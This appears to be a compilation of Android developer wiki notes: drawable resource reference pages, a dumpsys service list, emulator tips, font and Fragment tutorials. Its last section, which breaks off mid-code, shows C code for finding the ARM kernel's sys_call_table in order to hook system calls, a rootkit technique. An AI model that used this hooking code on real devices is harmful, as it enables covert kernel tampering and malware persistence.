Resource ID. A unique resource ID for this drawable. To create a new resource ID for this item, use the form: "@+id/name". The plus symbol indicates that this should be created as a new ID. You can use this identifier to retrieve and modify the drawable with View.findViewById() or Activity.findViewById().
android:top
Integer. The top offset in pixels.
android:right
Integer. The right offset in pixels.
android:bottom
Integer. The bottom offset in pixels.
android:left
Integer. The left offset in pixels.
example:
XML file saved at res/drawable/transition.xml:
<?xml version="1.0" encoding="utf-8"?>
<transition xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:drawable="@drawable/on" />
    <item android:drawable="@drawable/off" />
</transition>
This layout XML applies the drawable to a View:
<ImageButton
    android:id="@+id/button"
    android:layout_height="wrap_content"
    android:layout_width="wrap_content"
    android:src="@drawable/transition" />
And the following code performs a 500ms transition from the first item to the second:
ImageButton button = (ImageButton) findViewById(R.id.button);
TransitionDrawable drawable = (TransitionDrawable) button.getDrawable();
drawable.startTransition(500);
see also:
TransitionDrawable
Inset Drawable
A drawable defined in XML that insets another drawable by a specified distance. This is useful when a View needs a background that is smaller than the View's actual bounds.
file location:
res/drawable/filename.xml
The filename is used as the resource ID.
compiled resource datatype:
Resource pointer to a InsetDrawable.
resource reference:
In Java: R.drawable.filename
In XML: @[package:]drawable/filename
syntax:
<?xml version="1.0" encoding="utf-8"?>
<inset
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:drawable="@drawable/drawable_resource"
    android:insetTop="dimension"
    android:insetRight="dimension"
    android:insetBottom="dimension"
    android:insetLeft="dimension" />
elements:
<inset>
Defines the inset drawable. This must be the root element.
attributes:
xmlns:android
String. Required. Defines the XML namespace, which must be "http://schemas.android.com/apk/res/android".
android:drawable
Drawable resource. Required. Reference to a drawable resource to be inset.
android:insetTop
Dimension. The top inset, as a dimension value or dimension resource
android:insetRight
Dimension. The right inset, as a dimension value or dimension resource
android:insetBottom
Dimension. The bottom inset, as a dimension value or dimension resource
android:insetLeft
Dimension. The left inset, as a dimension value or dimension resource
example:
<?xml version="1.0" encoding="utf-8"?>
<inset xmlns:android="http://schemas.android.com/apk/res/android"
    android:drawable="@drawable/background"
    android:insetTop="10dp"
    android:insetLeft="10dp" />
see also:
InsetDrawable
Clip Drawable
A drawable defined in XML that clips another drawable based on this Drawable's current level. You can control how much the child drawable gets clipped in width and height based on the level, as well as a gravity to control where it is placed in its overall container. Most often used to implement things like progress bars.
file location:
res/drawable/filename.xml
The filename is used as the resource ID.
compiled resource datatype:
Resource pointer to a ClipDrawable.
resource reference:
In Java: R.drawable.filename
In XML: @[package:]drawable/filename
syntax:
<?xml version="1.0" encoding="utf-8"?>
<clip
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:drawable="@drawable/drawable_resource"
    android:clipOrientation=["horizontal" | "vertical"]
    android:gravity=["top" | "bottom" | "left" | "right" | "center_vertical" |
                     "fill_vertical" | "center_horizontal" | "fill_horizontal" |
                     "center" | "fill" | "clip_vertical" | "clip_horizontal"] />
elements:
<clip>
Defines the clip drawable. This must be the root element.
attributes:
xmlns:android
String. Required. Defines the XML namespace, which must be "http://schemas.android.com/apk/res/android".
android:drawable
Drawable resource. Required. Reference to a drawable resource to be clipped.
android:clipOrientation
Keyword. The orientation for the clip.
Must be one of the following constant values:
Value	Description
horizontal	Clip the drawable horizontally.
vertical	Clip the drawable vertically.
android:gravity
Keyword. Specifies where to clip within the drawable.
Must be one or more (separated by '|') of the following constant values:
Value	Description
top	Put the object at the top of its container, not changing its size. When clipOrientation is "vertical", clipping occurs at the bottom of the drawable.
bottom	Put the object at the bottom of its container, not changing its size. When clipOrientation is "vertical", clipping occurs at the top of the drawable.
left	Put the object at the left edge of its container, not changing its size. This is the default. When clipOrientation is "horizontal", clipping occurs at the right side of the drawable. This is the default.
right	Put the object at the right edge of its container, not changing its size. When clipOrientation is "horizontal", clipping occurs at the left side of the drawable.
center_vertical	Place object in the vertical center of its container, not changing its size. Clipping behaves the same as when gravity is "center".
fill_vertical	Grow the vertical size of the object if needed so it completely fills its container. When clipOrientation is "vertical", no clipping occurs because the drawable fills the vertical space (unless the drawable level is 0, in which case it's not visible).
center_horizontal	Place object in the horizontal center of its container, not changing its size. Clipping behaves the same as when gravity is "center".
fill_horizontal	Grow the horizontal size of the object if needed so it completely fills its container. When clipOrientation is "horizontal", no clipping occurs because the drawable fills the horizontal space (unless the drawable level is 0, in which case it's not visible).
center	Place the object in the center of its container in both the vertical and horizontal axis, not changing its size. When clipOrientation is "horizontal", clipping occurs on the left and right. When clipOrientation is "vertical", clipping occurs on the top and bottom.
fill	Grow the horizontal and vertical size of the object if needed so it completely fills its container. No clipping occurs because the drawable fills the horizontal and vertical space (unless the drawable level is 0, in which case it's not visible).
clip_vertical	Additional option that can be set to have the top and/or bottom edges of the child clipped to its container's bounds. The clip is based on the vertical gravity: a top gravity clips the bottom edge, a bottom gravity clips the top edge, and neither clips both edges.
clip_horizontal	Additional option that can be set to have the left and/or right edges of the child clipped to its container's bounds. The clip is based on the horizontal gravity: a left gravity clips the right edge, a right gravity clips the left edge, and neither clips both edges.
example:
XML file saved at res/drawable/clip.xml:
<?xml version="1.0" encoding="utf-8"?>
<clip xmlns:android="http://schemas.android.com/apk/res/android"
    android:drawable="@drawable/android"
    android:clipOrientation="horizontal"
    android:gravity="left" />
The following layout XML applies the clip drawable to a View:
<ImageView
    android:id="@+id/image"
    android:background="@drawable/clip"
    android:layout_height="wrap_content"
    android:layout_width="wrap_content" />
The following code gets the drawable and increases the amount of clipping in order to progressively reveal the image:
ImageView imageview = (ImageView) findViewById(R.id.image);
ClipDrawable drawable = (ClipDrawable) imageview.getDrawable();
drawable.setLevel(drawable.getLevel() + 1000);
Increasing the level reduces the amount of clipping and slowly reveals the image. Here it is at a level of 7000:
Note: The default level is 0, which is fully clipped so the image is not visible. When the level is 10,000, the image is not clipped and completely visible.
see also:
ClipDrawable
Scale Drawable
A drawable defined in XML that changes the size of another drawable based on its current level.
file location:
res/drawable/filename.xml
The filename is used as the resource ID.
compiled resource datatype:
Resource pointer to a ScaleDrawable.
resource reference:
In Java: R.drawable.filename
In XML: @[package:]drawable/filename
syntax:
<?xml version="1.0" encoding="utf-8"?>
<scale
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:drawable="@drawable/drawable_resource"
    android:scaleGravity=["top" | "bottom" | "left" | "right" | "center_vertical" |
                          "fill_vertical" | "center_horizontal" | "fill_horizontal" |
                          "center" | "fill" | "clip_vertical" | "clip_horizontal"]
    android:scaleHeight="percentage"
    android:scaleWidth="percentage" />
elements:
<scale>
Defines the scale drawable. This must be the root element.
attributes:
xmlns:android
String. Required. Defines the XML namespace, which must be "http://schemas.android.com/apk/res/android".
android:drawable
Drawable resource. Required. Reference to a drawable resource.
android:scaleGravity
Keyword. Specifies the gravity position after scaling.
Must be one or more (separated by '|') of the following constant values:
Value	Description
top	Put the object at the top of its container, not changing its size.
bottom	Put the object at the bottom of its container, not changing its size.
left	Put the object at the left edge of its container, not changing its size. This is the default.
right	Put the object at the right edge of its container, not changing its size.
center_vertical	Place object in the vertical center of its container, not changing its size.
fill_vertical	Grow the vertical size of the object if needed so it completely fills its container.
center_horizontal	Place object in the horizontal center of its container, not changing its size.
fill_horizontal	Grow the horizontal size of the object if needed so it completely fills its container.
center	Place the object in the center of its container in both the vertical and horizontal axis, not changing its size.
fill	Grow the horizontal and vertical size of the object if needed so it completely fills its container.
clip_vertical	Additional option that can be set to have the top and/or bottom edges of the child clipped to its container's bounds. The clip is based on the vertical gravity: a top gravity clips the bottom edge, a bottom gravity clips the top edge, and neither clips both edges.
clip_horizontal	Additional option that can be set to have the left and/or right edges of the child clipped to its container's bounds. The clip is based on the horizontal gravity: a left gravity clips the right edge, a right gravity clips the left edge, and neither clips both edges.
android:scaleHeight
Percentage. The scale height, expressed as a percentage of the drawable's bound. The value's format is XX%. For instance: 100%, 12.5%, etc.
android:scaleWidth
Percentage. The scale width, expressed as a percentage of the drawable's bound. The value's format is XX%. For instance: 100%, 12.5%, etc.
example:
<?xml version="1.0" encoding="utf-8"?>
<scale xmlns:android="http://schemas.android.com/apk/res/android"
    android:drawable="@drawable/logo"
    android:scaleGravity="center_vertical|center_horizontal"
    android:scaleHeight="80%"
    android:scaleWidth="80%" />
see also:
ScaleDrawable
Shape Drawable
This is a generic shape defined in XML.
file location:
res/drawable/filename.xml
The filename is used as the resource ID.
compiled resource datatype:
Resource pointer to a GradientDrawable.
resource reference:
In Java: R.drawable.filename
In XML: @[package:]drawable/filename
syntax:
<?xml version="1.0" encoding="utf-8"?>
<shape
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:shape=["rectangle" | "oval" | "line" | "ring"] >
    <corners
        android:radius="integer"
        android:topLeftRadius="integer"
        android:topRightRadius="integer"
        android:bottomLeftRadius="integer"
        android:bottomRightRadius="integer" />
    <gradient
        android:angle="integer"
        android:centerX="integer"
        android:centerY="integer"
        android:centerColor="integer"
        android:endColor="color"
        android:gradientRadius="integer"
        android:startColor="color"
        android:type=["linear" | "radial" | "sweep"]
        android:useLevel=["true" | "false"] />
    <padding
        android:left="integer"
        android:top="integer"
        android:right="integer"
        android:bottom="integer" />
    <size
        android:width="integer"
        android:height="integer" />
    <solid
        android:color="color" />
    <stroke
        android:width="integer"
        android:color="color"
        android:dashWidth="integer"
        android:dashGap="integer" />
</shape>
elements:
<shape>
The shape drawable. This must be the root element.
attributes:
xmlns:android
String. Required. Defines the XML namespace, which must be "http://schemas.android.com/apk/res/android".
android:shape
Keyword. Defines the type of shape. Valid values are:
Value	Desciption
"rectangle"	A rectangle that fills the containing View. This is the default shape.
"oval"	An oval shape that fits the dimensions of the containing View.
"line"	A horizontal line that spans the width of the containing View. This shape requires the <stroke> element to define the width of the line.
"ring"	A ring shape.
The following attributes are used only when android:shape="ring":
android:innerRadius
Dimension. The radius for the inner part of the ring (the hole in the middle), as a dimension value or dimension resource.
android:innerRadiusRatio
Float. The radius for the inner part of the ring, expressed as a ratio of the ring's width. For instance, if android:innerRadiusRatio="5", then the inner radius equals the ring's width divided by 5. This value is overridden by android:innerRadius. Default value is 9.
android:thickness
Dimension. The thickness of the ring, as a dimension value or dimension resource.
android:thicknessRatio
Float. The thickness of the ring, expressed as a ratio of the ring's width. For instance, if android:thicknessRatio="2", then the thickness equals the ring's width divided by 2. This value is overridden by android:innerRadius. Default value is 3.
android:useLevel
Boolean. "true" if this is used as a LevelListDrawable. This should normally be "false" or your shape may not appear.
<corners>
Creates rounded corners for the shape. Applies only when the shape is a rectangle.
attributes:
android:radius
Dimension. The radius for all corners, as a dimension value or dimension resource. This is overridden for each corner by the following attributes.
android:topLeftRadius
Dimension. The radius for the top-left corner, as a dimension value or dimension resource.
android:topRightRadius
Dimension. The radius for the top-right corner, as a dimension value or dimension resource.
android:bottomLeftRadius
Dimension. The radius for the bottom-left corner, as a dimension value or dimension resource.
android:bottomRightRadius
Dimension. The radius for the bottom-right corner, as a dimension value or dimension resource.
Note: Every corner must (initially) be provided a corner radius greater than 1, or else no corners are rounded. If you want specific corners to not be rounded, a work-around is to use android:radius to set a default corner radius greater than 1, but then override each and every corner with the values you really want, providing zero ("0dp") where you don't want rounded corners.
<gradient>
Specifies a gradient color for the shape.
attributes:
android:angle
Integer. The angle for the gradient, in degrees. 0 is left to right, 90 is bottom to top. It must be a multiple of 45. Default is 0.
android:centerX
Float. The relative X-position for the center of the gradient (0 - 1.0).
android:centerY
Float. The relative Y-position for the center of the gradient (0 - 1.0).
android:centerColor
Color. Optional color that comes between the start and end colors, as a hexadecimal value or color resource.
android:endColor
Color. The ending color, as a hexadecimal value or color resource.
android:gradientRadius
Float. The radius for the gradient. Only applied when android:type="radial".
android:startColor
Color. The starting color, as a hexadecimal value or color resource.
android:type
Keyword. The type of gradient pattern to apply. Valid values are:
Value	Description
"linear"	A linear gradient. This is the default.
"radial"	A radial gradient. The start color is the center color.
"sweep"	A sweeping line gradient.
android:useLevel
Boolean. "true" if this is used as a LevelListDrawable.
<padding>
Padding to apply to the containing View element (this pads the position of the View content, not the shape).
attributes:
android:left
Dimension. Left padding, as a dimension value or dimension resource.
android:top
Dimension. Top padding, as a dimension value or dimension resource.
android:right
Dimension. Right padding, as a dimension value or dimension resource.
android:bottom
Dimension. Bottom padding, as a dimension value or dimension resource.
<size>
The size of the shape.
attributes:
android:height
Dimension. The height of the shape, as a dimension value or dimension resource.
android:width
Dimension. The width of the shape, as a dimension value or dimension resource.
Note: The shape scales to the size of the container View proportionate to the dimensions defined here, by default. When you use the shape in an ImageView, you can restrict scaling by setting the android:scaleType to "center".
<solid>
A solid color to fill the shape.
attributes:
android:color
Color. The color to apply to the shape, as a hexadecimal value or color resource.
<stroke>
A stroke line for the shape.
attributes:
android:width
Dimension. The thickness of the line, as a dimension value or dimension resource.
android:color
Color. The color of the line, as a hexadecimal value or color resource.
android:dashGap
Dimension. The distance between line dashes, as a dimension value or dimension resource. Only valid if android:dashWidth is set.
android:dashWidth
Dimension. The size of each dash line, as a dimension value or dimension resource. Only valid if android:dashGap is set.
example:
XML file saved at res/drawable/gradient_box.xml:
<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android"
    android:shape="rectangle">
    <gradient
        android:startColor="#FFFF0000"
        android:endColor="#80FF00FF"
        android:angle="45"/>
    <padding android:left="7dp"
        android:top="7dp"
        android:right="7dp"
        android:bottom="7dp" />
    <corners android:radius="8dp" />
</shape>
This layout XML applies the shape drawable to a View:
<TextView
    android:background="@drawable/gradient_box"
    android:layout_height="wrap_content"
    android:layout_width="wrap_content" />
This application code gets the shape drawable and applies it to a View:
Resources res = getResources();
Drawable shape = res. getDrawable(R.drawable.gradient_box);
TextView tv = (TextView)findViewByID(R.id.textview);
tv.setBackground(shape);
see also:
ShapeDrawable
PREVIOUSNEXT
Except as noted, this content is licensed under Apache 2.0. For details and restrictions, see the Content License.
Android 4.2 r1 — 22 Dec 2012 1:08
About Android  |  Legal  |  Support
[[TOC]]
# dumpsys
命令格式:
```
$ adb shell dumpsys [filter-name]
```
# 过滤器
没有发现现成的帮助文档，可以使用如下命令打印全部过滤器:
```sh
$ adb shell dumpsys | sed -e 's/DUMP OF SERVICE (.*)://g;tx;d;:x'
```
# AtCmdFwd
# FMPlayer
# Hdmi
# MhlRcp
# SurfaceFlinger
# accessibility
# account
# activity
# alarm
# apn_settings_policy
# application_policy
# appwidget
# audio
# backup
# battery
# batteryinfo
# bluetooth
# bluetooth_a2dp
# bluetooth_hid
# bluetooth_policy
# browser_policy
# bt_fm_radio
# calling_policy
# clipboard
# clipboardEx
# com.lifevibes.ma.ipc
# connectivity
# content
# cpuinfo
# datarouter
# date_time_policy
# device_info
# device_policy
# devicestoragemonitor
# diskstats
# dropbox
# eas_account_policy
# email_account_policy
# encrypt
# enterprise_policy
# enterprise_vpn_policy
# entropy
# firewall_policy
# hardware
# hdmi
# input_method
# iphonesubinfo
# isms
# location
# location_policy
# mdm.remotedesktop
# media.audio_flinger
# media.audio_policy
# media.camera
# media.player
# media.yamahaplayer
# meminfo
# misc_policy
# motion_recognition
# mount
# netstat
# network_management
# notification
# package
# password_policy
# permission
# phone
# phone_restriction_policy
# phoneext
# power
# remoteinjection
# restriction_policy
# roaming_policy
# samsung.theme_service
# search
# security_policy
# sensorservice
# simphonebook
# statusbar
# telephony.registry
# throttle
# tvout
# tvoutservice
# uimode
# usagestats
# usb
# usbstorage
# vibrator
# vpn_policy
# wallpaper
# wifi
# wifi_policy
# window
# Emulator =
Google Android Emulator Tutorial
Hello Android fans and developers. I'd like to share with you some emulator skins I created for the Google Android SDK. They are tested to work with the latest Android SDK version 1.0r1.
Installation of new Skins
Using a blank screen as Skin
Changing the window size of the Android Emulator
Controlling the Android Emulator through keyboard keys
Creating an SD card for use in Android Emulator
Installation of new Skins
Unpack the .zip file and copy the created directory and files to ./tools/lib/images/skins/ within the installation directory of the Android SDK.
If you have eclipse running restart it to refresh the list of available screen sizes in the run configuration.
Go to -> Run -> Run Configurations... -> Target -> Emulator launch parameters and choose your new skin.
 
Using a blank screen as Skin
If you are not in the need for fancy devices showing in the emulator window, want to waste as little screen property as possible for the emulator and are prepared to use the keyboard shortcuts to maneuver the emulated Android device, then you may start the emulator adding the simple command line option -skin ­­<width>x<height>.
For example, using the option -skin ­­320x480 will provide you with a small window in the standard resolution of the HTC Dream / T-Mobile G1.
This is a great and fast way to test various display resolutions without the need for a dedicated skin to be created first.
 
Changing the window size of the Android Emulator
For those of you developing on a typical notebook the skins with resolutions of VGA and above may produce an emulator window that doesn't fit onto the desktop anymore. Since using a skin with a lower resolution might position the Android screen objects in a different way it may not desirable to retreat to those if testing is needed for high resolution devices.
The solution is to append the parameter -scale ­­<scale factor> to the Emulator launch parameters. In eclipse, put it in the field "Additional Emulator Command Line Options" within the Run Configuration.
Allowed scale factors are those between 0.1 and 3, although the most common will probably be -scale 0.5 .
 
Controlling the Android Emulator through keyboard keys
Keypad keys only work when NumLock is deactivated.
# Controls for the Android OS ==
||= Keyboard   =||=OS function=||
||Escape       || Back button||
||Home	       || Home button||
||F2, PageUp   || Menu (Soft-Left) button||
||Shift-F2, PageDown	 ||Star (Soft-Right) button||
||F3 ||	Call/Dial button||
||F4 ||	Hangup/EndCall button||
||F5 ||	Search button||
||F7 ||	Power button||
||Ctrl-F3, Ctrl-KEYPAD_5|| Camera button||
||Ctrl-F5, KEYPAD_PLUS	|| Volume up button||
||Ctrl-F6, KEYPAD_MINUS || Volume down button||
||KEYPAD_5||	DPad center||
||KEYPAD_4||	DPad left||
||KEYPAD_6||	DPad right||
||KEYPAD_8||	DPad up||
||KEYPAD_2||	DPad down||
# Controls for the Android Emulator ==||
||Keyboard ||	Emulator function||
||F8	|| toggle cell network on/off||
||F9	|| toggle code profiling (when -trace option set)||
||Alt-ENTER	|| toggle fullscreen mode||
||Ctrl-T	|| toggle trackball mode||
||Ctrl-F11, KEYPAD_7 ||	switch to previous layout||
||Ctrl-F12, KEYPAD_9 ||	switch to next layout||
||KEYPAD_MULTIPLY	|| increase onion alpha||
||KEYPAD_DIVIDE	|| decrease onion alpha||
# Creating an SD card for use in Android Emulator ==
To create an image of an SD card we use the command mksdcard -l <label> <size>[K­|M] <file>.
For example, to create a small SD card for testing purposes we might use the command mksdcard -l SD256M 256M sd256m.img to receive a 256MB image named sd256m.img. The resulting file is a standard FAT32 image file that can be mounted as such and prefilled with files we later want to use within Android. To tell the Android Emulator to use an SD card, we append the parameter -sdcard <imagefile> to the emulator command line options where "imagefile" includes the whole path to the file.
# Android Fonts 
# 设置字体阴影
 * `android:shadowColor`   Shadow color in the same format as textColor.
 * `android:shadowRadius`  Radius of the shadow specified as a floating point number.
 * `android:shadowDx`      The shadow’s horizontal offset specified as a floating point number.
 * `android:shadowDy`      The shadow’s vertical offset specified as a floating point number.
```
#!xml
<TextView  
        android:layout_width="fill_parent"  
        android:layout_height="wrap_content"  
        android:text="A light blue shadow."  
        android:shadowColor="#00ccff"  
        android:shadowRadius="1.5"  
        android:shadowDx="1"  
        android:shadowDy="1"  
        />  
```
# 设置字体
```
#!java
TextView txt = (TextView) findViewById(R.id.custom_font);  
Typeface font = Typeface.createFromAsset(getAssets(), "Chantelli_Antiqua.ttf");  
txt.setTypeface(font);  
```
# 参考
 * http://mobile.tutsplus.com/tutorials/android/customize-android-fonts/
# Fragments
# 简介
 * Android3.0引入
 * 3.0以下版本添加support-v4使用
 * 只有在Activity的Context下才能使用
# 引入原因
 * 大屏幕设备空间更大，通常一屏可以放多个Activity
 * 没有Fragments时，只能通过xlarge-layout重新定义布局
 * 提供更好的重用性,尤其当你的程序需要支持Tablet,并想保持良好的体验
 * 如果横树屏切换时需要变换布局，以往我们需要
   * 最简单的，通过Activity重建完成
   * 有了Fragments可以避免这个
 * Fragments也拥有类似于Activity的Stack结构，
 * 当大量数据更新，重会UI时使用 Fragments更加有效
 * 可以同时存在多个Fragments,它们的状态数据由FragmentManager管理
# 生命周期
[[Image(http://developer.android.com/images/fragment_lifecycle.png)]]
 * onInflate
 * onAttach
 * onCreate
 * onCreateView
 * onActivityCreated
 * onStart
 * onResume
 * onPause
 * onStop
 * onDestoryView
 * onDestory
 * onDetach
1. 穿件Fragments时，可以指定一些初始参数:
```
public static MyFragment newInstance(int index) {
    MyFragment f = new MyFragment();
    Bundle args = new Bundle();
    args.putInt(“index”, index);
    f.setArguments(args);
    return f;
}
```
2. onInflate
通常fragment直接嵌入到contentview中，当Activity加载layout时，回调用Fragment的onInflate
方法，此方法一般只是用于读出一些必要信息为以后所用。
3. onActach
此时Fragment已经于Activity关联起来，可以调用getActivity()获得依附的Activity.
此时还可以通过getArguments()方法读出之前设定的数据。
此时你不能再调用setArguments()了。
4. onCreate
此时你可以发起异步加载数据了，看一看Loader
4. onCreateView
Fragments不一定为要与view关联，当此时parent容器为空时，意味着
这个Fragments不需要使用view. 此时返回null就可以了。
这个方法常常看起来是这样的:
```
@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
    If(container == null)
        return null;
    View v = inflater.inflate(R.layout.details, container, false);
    TextView text1 = (TextView) v.findViewById(R.id.text1);
    text1.setText(myDataSet[ getPosition() ] );
    return v;
}
```
 * 千万别把新记载的View attach到 parent container上，注意那个false.
5. onActivityCreated
当Activity完成了onCreate, 该方法即被调用。
如果有多个Fragments，此时可以确保统统加载完毕。
6. onStart
Activity调用onStart后，调用Fragment的onStart, 所以此处的控制逻辑
放到Activity中也是可以的。
7. onResume
8. onPause
如果你使用了一些共享对象，比如媒体播放器什么的，此时需要释放。
9. onSaveInstanceState
此时可以保存一些状态数据了，如果你想保存其他Fragments的引用，记住
只要保存它们的tag即可，回头通过tag获得它们的真身。
10. onStop
11. onDestoryView
12. onDestory
此时Fragment还是属于Activity的
13. onDetach
Fragments的各种资源已被没收。
# setRetainInstance()
Fragments的生命力还可以更顽强，如果你在onCreate
时调用setRetainInstance(true), 那么它就获得这种复活的能力。
在结束生命后被系统管理起来，就像速冻饺子。当你再次需要
时，可以直接拿来。
# 如何添加Fragment?
通常Fragment需要被添加到ViewGroup中才能发挥作用。
# 方法1: 直接嵌入到Layout文件中
```xml
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="horizontal"
    android:layout_width="match_parent"
    android:layout_height="match_parent">
    <fragment android:name="com.example.news.ArticleReaderFragment"
            android:id="@+id/viewer"
            android:layout_weight="2"
            android:layout_width="0dp"
            android:layout_height="match_parent" />
</LinearLayout>
```
# 方法2: 使用FragmentManager添加/删除/替换
1. 在layout文件中加入容器(必须是ViewGroup, 比如常用的Layout都可以使用，诸如Button之类的不可使用)
```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/container"
    android:orientation="horizontal"
    android:layout_width="match_parent"
    android:layout_height="match_parent">
</LinearLayout>
```
2. 提交FragmentTransaction
```java
    FragmentManager fragmentManager = getFragmentManager()
    FragmentTransaction fragmentTransaction = fragmentManager.beginTransaction();
    // fragment将被装入到指定的容器(ViewGroup)中
    fragmentTransaction.add(R.id.container, fragment);
    fragmentTransaction.commit();
```
此例只提到了add方法, 此外还有: 
 * remove
 * replace
# addToBackStack()
```
// Create new fragment and transaction
Fragment newFragment = new ExampleFragment();
FragmentTransaction transaction = getFragmentManager().beginTransaction();
// Replace whatever is in the fragment_container view with this fragment,
// and add the transaction to the back stack
transaction.replace(R.id.fragment_container, newFragment);
transaction.addToBackStack(null);
// Commit the transaction
transaction.commit();
```
 * 你可以在FragmentTransaction中调用addToBackStack()方法将`newFragment`加入到BackStack中，这样当你按回退键时`newFragment`结束，回到添加之前的状态。
 * 如果你在commit前，针对fragment进行了多次add/replace/remove操作，而后调用了addToBackStack(), 那之前的全部操作将作为一个整体加入到BackStack中，此时按回退键，将回到诸操作之前的状态。
 * 你可以在同一个容器里装多个fragment,它出现在容器中的顺序由添加的先后顺序一致
 * 如果在添加fragment时没有在commit前调用addToBackStack(), 一但移除这个fragment, 该fragment就会被销毁，用户将无法回到这个fragment.  反之， fragment会被停止，使用back键，用户可以从当前的fragment回到之前的fragment.
```div class=warn
Caution: You can commit a transaction using commit() only prior to the activity saving its state (when the user leaves the activity). If you attempt to commit after that point, an exception will be thrown. This is because the state after the commit can be lost if the activity needs to be restored. For situations in which its okay that you lose the commit, use commitAllowingStateLoss().
```
# 使用FragmentManager管理Fragment
# 获得Fragment实例: findFragmentById() 或者 findFragmentByTag()
# 将Fragment实例弹出栈:  popBackStack()
# 监听栈的变化: addOnBackStackChangedListener()
# Fragment如何与Host Activity通讯
# 1. Fragment调用Activity中的方法:
Fragment可以获得与之关联的Activity:
```
    getActivity();
```
# 2. Fragment通知Acitivty
```java
public static class FragmentA extends ListFragment {
    ...
    // Host Activity 需要实现这个接口，Fragment即可利用此接口
    public interface OnArticleSelectedListener {
        public void onArticleSelected(Uri articleUri);
    }
    ...
}
```
HostActivity实现回调接口后， Fragment就可以在onAttach时检测HostActivity是否实现了指定接口。
```java
public static class FragmentA extends ListFragment {
    OnArticleSelectedListener mListener;
    ...
    @Override
    public void onAttach(Activity activity) {
        super.onAttach(activity);
        try {
            mListener = (OnArticleSelectedListener) activity;
        } catch (ClassCastException e) {
            throw new ClassCastException(activity.toString() + " must implement OnArticleSelectedListener");
        }
    }
    ...
}
```
[[TOC]]
# Fucking Hook
# 需找sys_call_table
sys_call_table is a table which stores the addresses of low-level system
routines. 
大多数经典的hooking技术都需要中断sys_call_table.
Most of classical hooking techniques interrupt the sys_call_table
for some purposes. 
Because of this, some protection techniques such as
hiding symbol and moving to the field of read-only have been adapted to
protect sys_call_table from attackers. 
为了保护sys_call_table, 诸如隐藏符号，将sys_call_table设置为只读等等都是为了避免遭受攻击。
These protections, however,
can be easily removed if an attacker uses kmem device access technique.
然而，这些保护措施在kmem device access technique面前形同虚设。
# 获取sys_call_table的长度
如何寻找sys_call_table呢？
f sys_call_table symbol is not exported and there is no sys_call_table
information in kallsyms file which contains kernel symbol table
information, it will be difficult to get the sys_call_table address that
varies on each version of platform kernel. 
sys_call_table符号通常都不会导出（kallsyms）， 寻找不同平台kernel的sys_call_table地址是首先需要解决的问题。
# ARM架构下的中断是如何实现的？
当中断产生，程序会跳转到ExceptionVectiorTable, 从中找到处理中断的程序(routines).
# Getting sys_call_table address in vector_swi handler
Generally, in the case of ARM process, when interrupt or exception happens,
it branches to the exception vector table. In that exception vector table,
there are exception hander addresses that match each exception handler
routines. The kernel of present Android platform uses high vector
(0xffff0000) and at the point of 0xffff0008, offset by 0x08, there is a 4
byte instruction to branch to the software interrupt handler. When the
instruction runs, the address of the software interrupt handler stored in
the address 0xffff0420, offset by 0x420, is called. See the section 5.1 for
more information.
```cpp
void get_sys_call_table(){
	void *swi_addr=(long *)0xffff0008;
	unsigned long offset=0;
	unsigned long *vector_swi_addr=0;
	unsigned long sys_call_table=0;
	offset=((*(long *)swi_addr)&0xfff)+8;
	vector_swi_addr=*(unsigned long *)(swi_addr+offset);
	while(vector_swi_addr++){
		if(((*(unsigned long *)vector_swi_addr)&0xfffff000) == 0xe28f8000){
			offset=((*(unsigned long *)vector_swi_addr) & 0xfff)+8;
			sys_call_table=(void *)vector_swi_addr+offset;
			break;
		}
	}
	return;
}
```
At first, this code gets the address of vector_swi routine(software
interrupt process exception handler) in the exception vector table of high
vector and then, gets the address of a code that handles the
sys_call_table address. The followings are some parts of vector_swi handler
code.
```s
000000c0 <vector_swi>:
    c0: e24dd048 sub     sp, sp, #72     ; 0x48 (S_FRAME_SIZE)
    c4: e88d1fff stmia   sp, {r0 - r12}  ; Calling r0 - r12
    c8: e28d803c add     r8, sp, #60     ; 0x3c (S_PC)
    cc: e9486000 stmdb   r8, {sp, lr}^   ; Calling sp, lr
    d0: e14f8000 mrs     r8, SPSR        ; called from non-FIQ mode, so ok.
    d4: e58de03c str     lr, [sp, #60]   ; Save calling PC
    d8: e58d8040 str     r8, [sp, #64]   ; Save CPSR
    dc: e58d0044 str     r0, [sp, #68]   ; Save OLD_R0
    e0: e3a0b000 mov     fp, #0  ; 0x0   ; zero fp
    e4: e3180020 tst     r8, #32 ; 0x20  ; this is SPSR from save_user_regs
    e8: 12877609 addne   r7, r7, #9437184; put OS number in
    ec: 051e7004 ldreq   r7, [lr, #-4]
    f0: e59fc0a8 ldr     ip, [pc, #168]  ; 1a0 <__cr_alignment>
    f4: e59cc000 ldr     ip, [ip]
    f8: ee01cf10 mcr     15, 0, ip, cr1, cr0, {0} ; update control register
    fc: e321f013 msr     CPSR_c, #19     ; 0x13 enable_irq
   100: e1a096ad mov     r9, sp, lsr #13 ; get_thread_info tsk
   104: e1a09689 mov     r9, r9, lsl #13
[*]108: e28f8094 add     r8, pc, #148    ; load syscall table pointer
   10c: e599c000 ldr     ip, [r9]        ; check for syscall tracing
```
另外一种较为简单的方法是通过sys_close的地址算出sys_call_table的地址， sys_close这个符号距sys_call_table起始地址的偏移量为0x6(24个字节)
```cpp
	while(vector_swi_addr++){
		if(*(unsigned long *)vector_swi_addr == &sys_close){
			sys_call_table = (void *)vector_swi_addr - (6*4);
			break;
		}
	}
```
有关这个实事，你可以从`fs/open.c`中见证:
```cpp
EXPORT_SYMBOL(sys_close);
...
call.S:
/* 0 */	CALL(sys_restart_syscall)
		CALL(sys_exit)
		CALL(sys_fork_wrapper)
		CALL(sys_read)
		CALL(sys_write)
/* 5 */	CALL(sys_open)
		CALL(sys_close)
```
This searching way has a technical disadvantage that we must get the
sys_close kernel symbol address beforehand if it's implemented in user
mode.
目前我们已经能够准确定位sys_call_table了， 接下来我们要计算它的长度，以便稍后可以将整个sys_call_table拷贝到堆中任由我们修改。
```cpp
	while(vector_swi_addr++){
